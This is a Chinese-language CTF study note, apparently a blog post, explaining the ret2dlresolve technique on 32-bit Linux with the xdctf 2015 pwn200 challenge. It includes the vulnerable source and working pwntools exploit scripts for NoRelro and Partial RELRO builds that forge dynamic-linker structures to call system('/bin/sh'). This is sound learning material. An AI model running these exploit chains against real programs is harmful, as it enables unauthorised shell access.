@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="google-site-verification" content="google-site-verification=Z6RovIqZTBN_qjzIY7nw1z0pxNqSQj3D-9vXqCynCXs"/>
+
+<title>
+    
+        [PWN]ret2dlresolve学习笔记（32位程序为例子） | b14ckb0x's space
+    
+</title>
+
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+</head>
+
+<body>
+
+<div id="wrapper">
+
+
+<header class="navbar">
+    <a href="/">Home</a>
+    <a href="/categories.html">Categories</a>
+    <a href="/about.html">About</a>
+    <a href="/links.html">Links</a>
+</header>
+
+<div class="container">
+    <article class="post">
+
+    <h1>[PWN]ret2dlresolve学习笔记（32位程序为例子）</h1>
+
+    <div class="post-info">
+        2026-06-11
+    </div>
+
+    <div class="post-content">
+        <h1 id="ret2dlresolve">ret2dlresolve</h1>
+
+<p>本次学习以32位为例子，linux的动态链接使用的是_dl_runtime_resolve(link_map_obj, reloc_offset)。先来看看相关原理。</p>
+
+<h2 id="相关原理">相关原理</h2>
+<p>（1）.dynamic的结构类似一个键值对数组，重定位表项、动态符号表、动态字符串表在其中的结构类似：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DT_SYMTAB 6 d_ptr //指向动态符号表
+DT_STRTAB 5 d_ptr //指向动态字符串表
+DT_REL 17 d_ptr  //重定位表，指向.rel.dyn
+DT_RELA 7 d_ptr //重定位表，指向.rela.dyn
+</code></pre></div></div>
+
+<p>（2）ELF文件中，每个需要重定位的ELF节都有对应的重定位表，比如.text节如果需要重定位，那么就会对应.rel.text。在导入一个函数时，_dl_runtime_resolve会根据reloc_offset（32位叫reloc_arg，64位叫reloc_index）去.rel.plt中找偏移对应的值，然后去.dynsym找对应的符号名称，再在.dynstr中找对应的函数名字符串。</p>
+
+<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref1.png" alt="ref1" /></p>
+
+<p>（3）_dl_runtime_resolve是用汇编编写的，32位和64位也有不同之处。这个函数的代码功能简单来说就是保存寄存器，然后调用_dl_fixup执行具体绑定的过程，64位的话，除了更多寄存器和用寄存器传参而非栈传参，就是最后返回的区别了，32位函数的最后是ret，64位则是jmp</p>
+
+<p>因此如果能修改_dl_runtime_resolve(link_map_obj, reloc_offset)的参数，就能使这个函数在解析的时候解析到我们想去的函数。具体的，我们需要修改.dynamic节，因为这个节包含重定位表项、动态符号表、动态字符串表。
+不过.dynamic没这么好改，开了RELRO的情况下，重定位表项、动态符号表、动态字符串表都是只读的，比较可行的思路是伪造重定位偏移reloc_offset，但是“我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。”</p>
+
+<p>来看看不同情况的具体题目吧</p>
+
+<h2 id="norelro-32">NoRelro 32</h2>
+
+<p>xdctf 2015 pwn200</p>
+
+<p>源码</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="s">"Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="n">vuln</span><span class="p">();</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>现在用gcc来编译32位版本</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-m32</span> <span class="nt">-z</span> norelro <span class="nt">-no-pie</span> pwn.c <span class="nt">-o</span> norelro32
+</code></pre></div></div>
+
+<p>其实从题目也可以看出来不难，直接正常打就行了，这里用ret2dlresolve的技巧来打。先讲讲这个编译，可以看出来关闭了栈保护，关闭了relro（即关闭了GOT/PLT等的只读），关闭了pie，payload如下</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">tmux</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">new-window</span><span class="sh">"</span><span class="p">]</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">i386</span><span class="sh">"</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./norelro32</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="sh">"</span><span class="s">./norelro32</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./norelro32</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="sh">'</span><span class="s">b main</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">'</span><span class="s">Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="n">offset</span><span class="o">*</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x0804b184</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># modify .dynstr pointer in .dynamic section to a specific location
+</span><span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">get_section_by_name</span><span class="p">(</span><span class="sh">'</span><span class="s">.dynstr</span><span class="sh">'</span><span class="p">).</span><span class="nf">data</span><span class="p">()</span>
+<span class="n">dynstr</span> <span class="o">=</span> <span class="n">dynstr</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">read</span><span class="sh">"</span><span class="p">,</span><span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x0804b260</span><span class="p">,</span><span class="nf">len</span><span class="p">((</span><span class="n">dynstr</span><span class="p">)))</span> <span class="c1"># construct a fake dynstr section in bss
+</span><span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x0804b260</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span><span class="nf">len</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">))</span> <span class="c1"># read /bin/sh\x00
+</span><span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="mh">0x08049056</span><span class="p">)</span> <span class="c1"># the second instruction of read@plt 
+</span><span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="mh">0x0804b260</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="nf">assert</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">())</span><span class="o">&lt;=</span><span class="mi">256</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">raw</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mi">256</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">())))</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">dump</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804b260</span><span class="p">))</span> <span class="c1"># hijack .dynstr to bss
+</span><span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">dynstr</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>下面来解析一下，首先因为关闭了RELRO，所以got、plt啥的就可以写了，当然了.dynamic节也会可写了，所以就通过写.dynamic节，把read替换成system，这样调用_dl_runtime_resolve的时候，就会把read函数解析成system，然后就能getshell了，payload的执行过程如下</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.第一个read是程序原本的read，触发栈溢出，返回到我们rop的第一个read函数，往0x0804b184+4<span class="o">(</span>即.dynamic节的DT_STRTAB的d_val<span class="o">)</span>读取4字节，读入的内容是0x0804b260，这是一个bss的地址，也就是把.dynstr的位置劫持到我们可写的bss段
+2.利用pwntools获取到原来.dynstr的完整内容，然后把里面的read替换成system，再利用rop链里的第二个read，把修改后的.dynstr读入到bss段
+3.第三个read，往bss上读入/bin/sh
+4.此时栈上的布局是0x08049056（下一个返回的地址），0xdeadbeef（下下个返回地址），函数参数。0x08049056就是read@plt的第二条指令，函数参数已被构造为system的参数，而此时.dynstr已被劫持，只要再次触发read的_dl_runtime_resolve就能解析到system执行
+</code></pre></div></div>
+
+<p>如图，这是.dynamic在IDA中的表现形式</p>
+
+<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref2.png" alt="ref2" /></p>
+
+<p>为什么要劫持到read@plt的第二条指令呢，因为read先前已经执行并解析过了，如果劫持到第一条jmp，那么会直接跳到真实地址，而不是触发解析，下图是read@plt，可以看到第一条jmp，第二条push，第三条jmp。</p>
+
+<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref3.png" alt="ref3" /></p>
+
+<p>顺便说说pwntools的这个rop对象，这个就相当于把平时p64自动打包好了，不用自己手写完整的链条了。</p>
+
+<h2 id="partialrelro-32">PartialRelro 32</h2>
+
+<p>开了部分relro后，.dynamic就不可写了，需要自己伪造重定位表项。这里先简单说说大概怎么个伪造方法，其实和堆里面伪造一个fake chunk的原理差不多，在内存中找一个空的位置，根据重定位表的结构，伪造相关的数据，再让_dl_runtime_resolve的reloc_offset参数指向我们伪造的那片内存的重定位项就可以了。pwntools里有自动构造dlresolve的payload的工具了，这里就来讲讲这个工具的使用的方式，和其构造的payload具体是怎么样的吧</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">tmux</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">new-window</span><span class="sh">"</span><span class="p">]</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="sh">"</span><span class="s">i386</span><span class="sh">"</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="nf">process</span><span class="p">(</span><span class="sh">"</span><span class="s">./partialrelro32</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="sh">"</span><span class="s">./partialrelro32</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./partialrelro32</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">dlresolve</span> <span class="o">=</span> <span class="nc">Ret2dlresolvePayload</span><span class="p">(</span><span class="n">elf</span><span class="p">,</span><span class="n">symbol</span><span class="o">=</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">])</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dlresolve</span><span class="p">.</span><span class="n">data_addr</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">.</span><span class="nf">ret2dlresolve</span><span class="p">(</span><span class="n">dlresolve</span><span class="p">)</span>
+<span class="n">raw_rop</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="nf">chain</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span><span class="mi">112</span><span class="p">:</span><span class="n">raw_rop</span><span class="p">,</span> <span class="mi">256</span><span class="p">:</span><span class="n">dlresolve</span><span class="p">.</span><span class="n">payload</span><span class="p">})</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Ret2dlresolvePayload接收三个参数，一个是程序的elf对象，第二个参数是希望动态解析的目标函数字符串，这里是symbol=”system”，第三个参数是第二个目标函数的参数，。这个函数构造好dlresolve对象后，调用dlresolve.data_addr计算可写的地址，就是计算可以把伪造的重定向表放在哪里，再调用rop.ret2dlresolve(dlresolve)，使程序在rop链的最后返回到_dl_runtime_resolve执行解析。dlresolve.payload则是包含了完整的伪造重定向表。写成p32的形式，两个payload（忽略掉填充）分别是这样，raw_rop：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop_chain</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08049050</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># read@plt
+</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804901b</span><span class="p">)</span> <span class="o">+</span>      <span class="c1">#  add esp, pop ebx, ret
+</span>
+    <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>
+    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804ce00</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># 程序中一个可读写的地址，可以去gdb里用vmmap来确认
+</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x65616161</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># read的长度参数，这里直接被padding顶替了
+</span>
+    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08049020</span><span class="p">)</span> <span class="o">+</span>      <span class="c1"># plt0
+</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x4a9c</span><span class="p">)</span> <span class="o">+</span>          <span class="c1"># reloc_arg
+</span>
+    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x68616161</span><span class="p">)</span> <span class="o">+</span>      <span class="c1">#这个也是padding，这个位置无作用，因为system执行完也不会返回
+</span>    <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804ce24</span><span class="p">)</span>        <span class="c1"># "/bin/sh"地址
+</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>开始分析前先讲讲plt0这个东西，它的汇编代码是这样的</p>
+
+<pre><code class="language-assembly">.plt:08049020 sub_8049020     proc near               ; CODE XREF: .plt:0804903B↓j
+.plt:08049020                                         ; .plt:0804904B↓j ...
+.plt:08049020 ; __unwind {
+.plt:08049020                 push    ds:dword_804B23C ; reloc_arg
+.plt:08049026                 jmp     ds:dword_804B240 ; _dl_runtime_resolve
+.plt:08049026 sub_8049020     endp
+.plt:08049026
+</code></pre>
+
+<p>和NoRelro中讲到的jmp-&gt;push-&gt;jmp解析还不太一样，当跳转到这里的push执行的时候，_dl_runtime_resolve并没有明确要解析什么函数，而是直接通过栈或者寄存器来传递reloc_arg参数，也就是说它要怎么解析全看栈或者寄存器上的数据，所以一般pwn都会利用这个来解析，这样无论程序的GOT里有没有对应函数，只要我们伪造了reloc_arg，就可以直接解析。</p>
+
+<p>这样第一段payload的总体流程就很好懂了，先利用溢出漏洞，跳转到rop里的read，通过这个read我们可以往指定的地方写入数据，写的内容则是伪造的重定位表，写完之后进行栈的修正（esp与ebp），然后就跳转到plt0，这时候由于在栈上伪造好了reloc_arg，所以就直接去解析内存中被伪造的重定位表执行system(‘/bin/sh’)。</p>
+
+<p>然后是dlresolve.payload部分，在这一部分我们会看到重定位表是怎么伪造的：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dlresolve_payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="sh">"</span><span class="s">system</span><span class="se">\x00</span><span class="sh">"</span>
+    <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">acaaa</span><span class="sh">"</span>
+
+    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x4b54</span><span class="p">)</span>
+    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x0804ce00</span><span class="p">)</span>
+    <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x04c007</span><span class="p">)</span>
+
+    <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<p>可以看看本文的第一副图片，现在要伪造的是.dynsym中的一个Elf32_Sym，其结构如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">Elf32_Word</span> <span class="n">st_name</span><span class="p">;</span>      <span class="c1">// 符号名在字符串表中的偏移, 4 bytes</span>
+    <span class="n">Elf32_Addr</span> <span class="n">st_value</span><span class="p">;</span>     <span class="c1">// 符号地址 , 4 bytes</span>
+    <span class="n">Elf32_Word</span> <span class="n">st_size</span><span class="p">;</span>      <span class="c1">// 大小, 4 bytes</span>
+ 
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="c1">// 1 bytes</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> <span class="c1">// 1 bytes</span>
+    <span class="n">Elf32_Half</span> <span class="n">st_shndx</span><span class="p">;</span>  <span class="c1">// 2 bytes</span>
+<span class="p">}</span> <span class="n">Elf32_Sym</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>其中st_name不是符号的字符串，也不是地址，而是符号在.dynstr中的偏移，而我们的dlresolve.payload，是这样去设置这些值的：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Elf32_Sym</span> <span class="n">fake_sym</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">.</span><span class="n">st_name</span>  <span class="o">=</span> <span class="mh">0x4b54</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">st_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">st_size</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+
+    <span class="p">.</span><span class="n">st_info</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">st_other</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">st_shndx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>dlresolve.payload把这个伪造的Elf32_Sym放在了0x804ce0c，开启debug模式就可以看到；而dlresolve.payload开头的“system”字符串则被read写入到了0x0804ce00，终端使用readelf可以看到.dynstr的地址正是0x80482ac，而加上0x4b54，就正好是0x0804ce00。</p>
+
+<p><img src="/assets/images/2026-06-11-ret2dlresolve/ref4.png" alt="ref4" /></p>
+
+<p>不过还没完，dlresolve.payload的后段，p32(0x0804ce00) + p32(0x04c007)，还伪造了另一个东西，就是本文第一张图片里的Elf32_Rel，具体是这样伪造的：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Elf32_Rel</span> <span class="n">fake_rel</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="p">.</span><span class="n">r_offset</span> <span class="o">=</span> <span class="mh">0x804ce00</span><span class="p">,</span>
+    <span class="p">.</span><span class="n">r_info</span>   <span class="o">=</span> <span class="mh">0x04c007</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>其中，r_info就是用来找到对应的Elf32_Sym，在x86里，它分为高24位和低8位，其中，低8位固定为7，不然链接器就不处理，高24位则用于索引对应的Elf32_Sym，这里高24位是0x0004c，那么就是去.dynsym（Symtab）的地址0x0804820c的第0x4c0条地方（注意这个0x4c0不是偏移量，而是说在表的第几个项目，算偏移量还需要乘上size，这里size是16）: 0x0804820c + 0x4c0 * F = 0x0804820c + 0x4c00 = 0x0804ce0c ，也就是之前放伪造的Elf32_Sym的地方。</p>
+
+<p>最后该把两串payload连起来看的，看看_dl_runtime_resolve是怎么找到伪造的Elf32_Rel的，其实很简单，我们触发plt0时，栈上的reloc_arg是0x4a9c，这个偏移值是和.rel.plt的0x08048380相加的（参考上一副图里的值吧），加起来就是0x0804ce1c，从read进去的偏移来算，刚好就是伪造的Elf32_Rel的地方，到这里PartialRelro 32的利用就算结束了。</p>
+
+<h2 id="full-relro-32">Full RELRO 32</h2>
+
+<p>这个模式下，REL相关的东西完全不可写了，程序开始执行前就会把函数地址解析完毕，_dl_runtime_resolve也不使用了，不过应该还是存在绕过方法的，毕竟_dl_runtime_resolve只是不用了，又不是删了，我查的资料中，似乎存在full relro下手动调用_dl_runtime_resolve，手动构造重定位表的方法，某种特定的情况下也许确实能用，等做题多一点应该就知道了。</p>
+
+<h2 id="64位">64位</h2>
+
+<p>64位的总体利用思路是和32差不多吧，这里只记录一下不同点，具体的题目做的时候再看吧（延迟绑定这一块）。</p>
+
+<p>首先是ELF_Rela变了，Rel后面多的a，表示多了一个addend,下面是它的结构体</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span> 
+	<span class="n">Elf64_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span> <span class="mi">8</span> <span class="n">bytes</span>
+	<span class="n">Elf64_Xword</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span> <span class="mi">8</span> <span class="n">bytes</span>
+	<span class="n">Elf64_Sxword</span> <span class="n">r_addend</span><span class="p">;</span> <span class="cm">/* Addend */</span> <span class="mi">8</span> <span class="n">bytes</span>
+<span class="p">}</span> <span class="n">Elf64_Rela</span><span class="p">;</span> 
+<span class="cm">/* How to extract and insert information held in the r_info field. */</span> 
+<span class="cp">#define ELF64_R_SYM(i) ((i) &gt;&gt; 32) 
+#define ELF64_R_TYPE(i) ((i) &amp; 0xffffffff) 
+#define ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))
+</span></code></pre></div></div>
+
+<p>Elf64_Rela结构体的大小为24字节，注意结构体中的变量都是64位了。</p>
+
+<p>然后是Elf64_Sym的结构体如下，</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span> 
+	<span class="n">Elf64_Word</span> <span class="n">st_name</span><span class="p">;</span> <span class="cm">/* Symbol name (string tbl index) */</span> <span class="mi">4</span> <span class="n">bytes</span>
+	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="cm">/* Symbol type and binding */</span> <span class="mi">1</span> <span class="n">bytes</span>
+	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> <span class="cm">/* Symbol visibility */</span> <span class="mi">1</span> <span class="n">bytes</span>
+	<span class="n">Elf64_Section</span> <span class="n">st_shndx</span><span class="p">;</span> <span class="cm">/* Section index */</span> <span class="mi">2</span> <span class="n">bytes</span>
+	<span class="n">Elf64_Addr</span> <span class="n">st_value</span><span class="p">;</span> <span class="cm">/* Symbol value */</span> <span class="mi">8</span> <span class="n">bytes</span>
+	<span class="n">Elf64_Xword</span> <span class="n">st_size</span><span class="p">;</span> <span class="cm">/* Symbol size */</span> <span class="mi">8</span> <span class="n">bytes</span>
+<span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Elf64_Word 32位，Elf64_Section 16位，Elf64_Addr 64位，Elf64_Xword 64位，合24字节。</p>
+
+<p>64位下，xxx@plt中的第二行的push就不是偏移了，变成了待解析符号在重定位表中的索引，比如write函数push的是0。</p>
+
+<p>还有一个要注意的点是，64位伪造重定位表，往往需要很多的溢出空间，如果程序没有这么多的栈给我们，我们还得自己实现栈迁移。</p>
+
+<p>就先这样吧，实战遇到题目再记录吧。</p>
+
+    </div>
+
+</article>
+</div>
+
+<footer class="footer">
+    Hacked by b14ckb0x
+</footer>
+
+
+</div>
+
+</body>
+</html>
